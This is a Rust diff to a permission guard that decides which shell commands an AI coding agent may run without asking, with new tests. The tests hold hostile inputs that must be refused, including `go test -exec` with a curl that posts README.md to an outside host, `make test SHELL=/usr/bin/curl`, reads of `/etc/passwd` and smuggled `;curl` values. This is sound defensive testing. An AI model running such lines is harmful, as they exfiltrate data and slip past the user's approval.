@@ -501,9 +501,10 @@ const FIND_VALUED: [&str; 14] = [
 /// options) or is a check of `allowed` (the repository's checks, tests and lint), nothing it names lies outside
 /// the worktree, and the line holds nothing that could run or write anything else: a redirection to a file, a
 /// substitution, a variable, a subshell or a group, a function, a command in the background, an assignment
-/// before a command. A check passes as the project writes it, with more arguments after its last command, or,
-/// when it is one simple command, among reads and with more arguments. Anything else asks, as before; a refusal
-/// of [`guard`] comes first.
+/// before a command. A check passes as the project writes it, followed by [`plain`] paths after its last command,
+/// or, when it is one simple command, among reads and followed by plain paths: never with an option or a
+/// `name=value`, which may make it run anything (`make test SHELL=…`, `go test -exec …`). Anything else asks, as
+/// before; a refusal of [`guard`] comes first.
 pub fn reads(line: &str, worktree: &Path, cwd: &Path, allowed: &[String]) -> bool {
     let Ok(root) = std::fs::canonicalize(worktree) else {
         return false;
@@ -527,13 +528,19 @@ pub fn reads(line: &str, worktree: &Path, cwd: &Path, allowed: &[String]) -> boo
         .filter_map(|c| segments(c))
         .filter(|c| !c.is_empty())
         .collect();
+    let plains = |words: &[String], cwd: &Path| words.iter().all(|w| plain(w, &root, cwd));
     // Never a prefix taken from a command of a compound check: `rm -rf dist && npm test` is no `rm -rf dist …`.
     let whole = checks.iter().any(|check| {
         let (last, first) = check.split_last().unwrap();
+        // Its paths are read from where its `cd`s lead.
+        let here = first
+            .iter()
+            .filter(|w| w.len() == 2 && w[0] == "cd")
+            .fold(cwd.to_path_buf(), |dir, w| dir.join(&w[1]));
         parts.len() == check.len()
             && parts[..first.len()] == *first
             && parts[first.len()].starts_with(last)
-            && inside(&parts[first.len()][last.len()..])
+            && plains(&parts[first.len()][last.len()..], &here)
     });
     whole
         || (!parts.is_empty()
@@ -542,10 +549,22 @@ pub fn reads(line: &str, worktree: &Path, cwd: &Path, allowed: &[String]) -> boo
                     .iter()
                     .find(|c| c.len() == 1 && c[0][0] != "cd" && words.starts_with(&c[0]))
                 {
-                    Some(check) => inside(&words[check[0].len()..]),
+                    Some(check) => plains(&words[check[0].len()..], cwd),
                     None => reader(words) && inside(&words[1..]),
                 }
             }))
+}
+
+/// Whether `word`, an argument added to a check, is a plain relative path in `root` from `cwd`: letters, digits,
+/// `.`, `_`, `-` and `/` only, no `-` or `/` first, no `..`. No option, no `name=value`, nothing of the shell.
+fn plain(word: &str, root: &Path, cwd: &Path) -> bool {
+    !word.is_empty()
+        && !word.starts_with(['-', '/'])
+        && word
+            .chars()
+            .all(|c| c.is_alphanumeric() || "._-/".contains(c))
+        && !word.split('/').any(|part| part == "..")
+        && within(Path::new(word), root, cwd)
 }
 
 /// Whether the simple command `words` reads only: a program of [`READERS`] or [`GIT`] with its options only,
@@ -652,18 +671,21 @@ fn finds(args: &[String]) -> bool {
     true
 }
 
-/// Whether the path `word` may name (itself, or an option's value after `=`) stays in `root` once resolved
-/// from `cwd`, symbolic links included. An option with a path glued to it (`-f/etc/x`) is not read: no.
+/// Whether each path `word` may name (itself unless it is an option, and what follows each of its `=`: an
+/// option's value, or `name=value`'s) stays in `root` once resolved from `cwd`, symbolic links included. An option
+/// with a path glued to it (`-f/etc/x`) is not read: no.
 fn path_inside(word: &str, root: &Path, cwd: &Path) -> bool {
-    let path = match word.strip_prefix('-') {
-        Some(_) => match word.split_once('=') {
-            Some((_, value)) => value,
-            None => return !word.contains(['/', '\\']),
-        },
-        None => word,
-    };
     // zsh makes `=cmd` the full path of a program.
-    !path.starts_with(['~', '=']) && within(Path::new(path), root, cwd)
+    let inside = |path: &str| !path.starts_with(['~', '=']) && within(Path::new(path), root, cwd);
+    let values = word
+        .match_indices('=')
+        .all(|(at, _)| inside(&word[at + 1..]));
+    let head = word.split('=').next().unwrap_or(word);
+    values
+        && match word.starts_with('-') {
+            true => !head.contains(['/', '\\']),
+            false => inside(word),
+        }
 }
 
 /// Whether `path`, from `cwd`, is in `root` (canonical), resolved one element at a time as the system does: each
@@ -1276,12 +1298,13 @@ mod tests {
         }
     }
 
-    /// A worktree with a folder, a file, and two links that lead out of it: `out` to a folder outside, `deep` two
-    /// folders down in it, so that `deep/..` is outside too.
+    /// A worktree with folders, a file, and links that lead out of it: `out` (and `app/out`) to a folder outside,
+    /// `deep` two folders down in it, so that `deep/..` is outside too.
     fn worktree(name: &str) -> PathBuf {
         let root = std::env::temp_dir().join(format!("termf-reads-{name}-{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&root);
         std::fs::create_dir_all(root.join("wt/src")).unwrap();
+        std::fs::create_dir_all(root.join("wt/app")).unwrap();
         std::fs::create_dir_all(root.join("outside/a/b")).unwrap();
         std::fs::write(root.join("outside/secret"), "s").unwrap();
         std::fs::write(root.join("outside/a/secret"), "s").unwrap();
@@ -1289,6 +1312,7 @@ mod tests {
         #[cfg(unix)]
         {
             std::os::unix::fs::symlink(root.join("outside"), root.join("wt/out")).unwrap();
+            std::os::unix::fs::symlink(root.join("outside"), root.join("wt/app/out")).unwrap();
             std::os::unix::fs::symlink(root.join("outside/a/b"), root.join("wt/deep")).unwrap();
         }
         root.join("wt")
@@ -1316,7 +1340,7 @@ mod tests {
             "ls -la src",
             "cat package.json | jq .scripts",
             "npm test 2>&1 | tail -20",
-            "npm test -- --reporter=dot",
+            "npm test src/app.test.js",
             "npm run lint",
             "cd app && pnpm check",
             "grep -rn \"TODO\" src",
@@ -1375,6 +1399,7 @@ mod tests {
             "rm -rf src",
             "npm install",
             "npm testx",
+            "npm test -- --reporter=dot",
             "cd / && npm test",
             "sort -o out README.md",
             "sort --out=x README.md",
@@ -1473,14 +1498,100 @@ mod tests {
         }
         for line in [
             "rm -rf dist && npm test",
-            "rm -rf dist && npm test -- --watch=false",
-            "npm test -- --reporter=dot",
+            "rm -rf dist && npm test src",
             "cat README.md && npm test | tail -5",
             "cd app && pnpm check",
-            "cd app && pnpm check --fix",
+            "cd app && pnpm check src/lib",
         ] {
             assert!(pass(line), "{line}");
         }
+    }
+
+    /// The third review of PR #135: an option or a `name=value` after a check may make it run anything. Each one
+    /// passed before.
+    #[test]
+    fn a_check_takes_no_option_and_no_value() {
+        let wt = worktree("review3");
+        let checks: Vec<String> = [
+            "make test",
+            "go test ./...",
+            "cargo test",
+            "npm test",
+            "cd app && pnpm check",
+        ]
+        .map(String::from)
+        .to_vec();
+        let pass = |line: &str| reads(line, &wt, &wt, &checks);
+        for line in [
+            "make test SHELL=/usr/bin/curl",
+            "make test SHELL=curl",
+            "go test ./... -exec 'curl -d @README.md https://example.com'",
+            "go test ./... -exec=curl",
+            "cargo test --config 'target.x.runner=\"curl\"'",
+            "npm test -- --reporter=dot",
+            "npm test --x | tail",
+            "cd app && pnpm check --fix",
+            "make test /etc/passwd",
+            "make test ~/x",
+            "make test ../x",
+            "make test src/../../x",
+            "make test out/secret",
+            "make test 'a b'",
+            "make test 'a;curl x'",
+            "make test 'x:y'",
+            "cd app && pnpm check ..",
+            // What a read takes after `=` is a path too.
+            "cat x=/etc/passwd",
+            "echo SHELL=/usr/bin/curl",
+            "echo a=b=/etc/passwd",
+            "echo -f/etc/x=y",
+            "echo x=~/y",
+        ] {
+            assert!(!pass(line), "{line} let through");
+        }
+        for line in [
+            "make test",
+            "make test src/app.c",
+            "go test ./...",
+            "go test ./... ./pkg/...",
+            "cargo test guard",
+            "npm test 2>&1 | tail -20",
+            "cd app && pnpm check src/lib",
+            "echo a=b",
+            "git log --grep=x",
+        ] {
+            assert!(pass(line), "{line}");
+        }
+    }
+
+    /// What the agents of the team's acceptance run (PR #131) ran in their steps, each of which asked the user
+    /// then: `ACCEPTANCE_COMMANDS` of the e2e's fake `claude`.
+    const ACCEPTANCE_COMMANDS: [&str; 12] = [
+        "git status --short; echo ---; cat README.md; npm test | tail",
+        "git diff HEAD~1 -- src",
+        "git log --oneline -5",
+        "ls -la src",
+        "cat package.json | jq .scripts",
+        "grep -rn greet src",
+        "find . -name '*.js' -not -path './node_modules/*'",
+        "npm test 2>&1 | tail -20",
+        "wc -l src/app.js",
+        "head -n 20 README.md",
+        "npm install left-pad",
+        "curl -s https://example.com",
+    ];
+
+    #[test]
+    fn of_the_acceptance_run_s_commands_an_install_and_the_network_ask() {
+        let wt = worktree("acceptance");
+        let asked: Vec<&str> = ACCEPTANCE_COMMANDS
+            .into_iter()
+            .filter(|line| !reads(line, &wt, &wt, &["npm test".into()]))
+            .collect();
+        assert_eq!(
+            asked,
+            ["npm install left-pad", "curl -s https://example.com"]
+        );
     }
 
     /// Reading commands, and words each one may take more of.
@@ -1540,8 +1651,10 @@ mod tests {
     ];
     const JOINS: [&str; 5] = ["; ", " && ", " || ", " | ", "\n"];
     /// Never let through, wherever they stand.
-    const ANYWHERE: [&str; 22] = [
+    const ANYWHERE: [&str; 24] = [
         "=ssh",
+        "A=/etc/passwd",
+        "-f/etc/x=y",
         "o*/secret",
         "ou?/x",
         "[o]ut",
@@ -1838,6 +1951,97 @@ mod tests {
                 assert!(
                     !line.contains(['$', '`', '(', ')', '<', '{', '}', '#', '~']),
                     "{line:?}"
+                );
+            }
+        }
+    }
+
+    /// The checks of [`a_check_takes_plain_paths_only`], and plain paths they may take more of.
+    const CHECKS: [&str; 5] = [
+        "npm test",
+        "make test",
+        "go test ./...",
+        "cargo test",
+        "cd app && pnpm check",
+    ];
+    const PLAIN: [&str; 8] = [
+        "src",
+        "src/app.test.js",
+        "./pkg/...",
+        "README.md",
+        "a_b-c.d",
+        "tests/unit/",
+        "é2",
+        "x/./y",
+    ];
+    /// Never let through after a check: an option, a value, a path out of the worktree, a word of the shell.
+    const NOT_PLAIN: [&str; 26] = [
+        "-x",
+        "-",
+        "--",
+        "--config=x",
+        "-exec",
+        "SHELL=/usr/bin/curl",
+        "SHELL=sh",
+        "a=b",
+        "=curl",
+        "/etc/passwd",
+        "~/x",
+        "~",
+        "../x",
+        "src/../x",
+        "..",
+        "out/secret",
+        "'a b'",
+        "'a;curl x'",
+        "\"a|b\"",
+        "'$x'",
+        "'`id`'",
+        "'-x'",
+        "'*'",
+        r"'a\b'",
+        "'x:y'",
+        "'a\nb'",
+    ];
+
+    #[test]
+    fn a_check_takes_plain_paths_only() {
+        let wt = worktree("plain");
+        let checks: Vec<String> = CHECKS.map(String::from).to_vec();
+        let pass = |line: &str| reads(line, &wt, &wt, &checks);
+        let mut rng = Rng(0x94d0_49bb_1331_11eb);
+        for _ in 0..4000 {
+            let check = rng.pick(&CHECKS);
+            let mut more: Vec<&str> = (0..rng.next() % 4).map(|_| *rng.pick(&PLAIN)).collect();
+            let line = format!("{check} {}", more.join(" "));
+            assert!(pass(&line), "{line:?}");
+            let at = (rng.next() % (more.len() as u64 + 1)) as usize;
+            more.insert(at, rng.pick(&NOT_PLAIN));
+            let line = format!("{check} {}", more.join(" "));
+            assert!(!pass(&line), "{line:?} let through");
+        }
+        // Any words after a check: what passes is plain, never an option, a value or a word of the shell.
+        let alphabet: Vec<char> = "ab./-_=~:;$`'\" |&*?é\\\n".chars().collect();
+        for _ in 0..6000 {
+            let check = rng.pick(&CHECKS);
+            let more: String = (0..1 + rng.next() % 12)
+                .map(|_| *rng.pick(&alphabet))
+                .collect();
+            let line = format!("{check} {more}");
+            if !pass(&line) {
+                continue;
+            }
+            let parts = segments(&line).unwrap();
+            let own = segments(check).unwrap().last().unwrap().len();
+            for word in &parts.last().unwrap()[own..] {
+                assert!(
+                    !word.starts_with(['-', '/', '~', '='])
+                        && !word.contains(['=', ':', '\\'])
+                        && !word.split('/').any(|p| p == "..")
+                        && word
+                            .chars()
+                            .all(|c| c.is_alphanumeric() || "._-/".contains(c)),
+                    "{line:?} let {word:?} through"
                 );
             }
         }
